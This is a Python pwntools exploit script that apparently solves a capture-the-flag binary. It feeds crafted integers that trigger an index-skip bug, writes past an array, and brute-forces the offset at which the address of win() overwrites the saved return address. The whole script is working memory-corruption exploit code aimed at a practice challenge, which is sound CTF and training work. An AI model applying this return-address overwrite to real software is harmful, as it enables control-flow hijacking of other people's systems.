#!/usr/bin/env python3
import os
os.environ["TERM"]="xterm"
from pwn import *
context.log_level="error"; context.arch="amd64"

BIN="/work/bigwin/chal_np"
elf=ELF(BIN)
win=elf.symbols["win"]
def s32(v):
    v &= 0xffffffff
    return v-0x100000000 if v>=0x80000000 else v

# Trigger exactly one skip: numbers[0..5]=0, numbers[6]=67 -> accum=67 -> i jumps 6->8.
# After that, keep accum != 67 by feeding a big constant so no re-trigger; i increments by 1.
# Writes go: i=8,9,10,... (numbers[8], numbers[9], ...). We search which two consecutive ints = RIP.
PRE=[0,0,0,0,0,0,67]
FILL=0x11111111  # keeps accum large, never 67

def run(tail_ints, timeout=4):
    p=process(BIN)
    data="\n".join(str(x) for x in (PRE+tail_ints)).encode()
    p.sendline(data)
    out=p.recvall(timeout=timeout)
    p.close()
    return out.decode(errors="replace")

# Offset = number of FILL ints (each i=8,9,...) before we drop the win address (2 ints: lo, hi).
lo=s32(win & 0xffffffff); hi=s32((win>>32)&0xffffffff)
found=None
for off in range(0, 40):
    tail=[FILL]*off + [lo, hi] + [FILL]*80
    txt=run(tail)
    if ("wtf you win" in txt) or ("fopen" in txt) or ("No such file" in txt) or ("/flag" in txt):
        found=off
        print(f"[+] REACHED win() at FILL offset={off}")
        print(txt[-250:])
        break
print("RESULT_OFFSET", found)
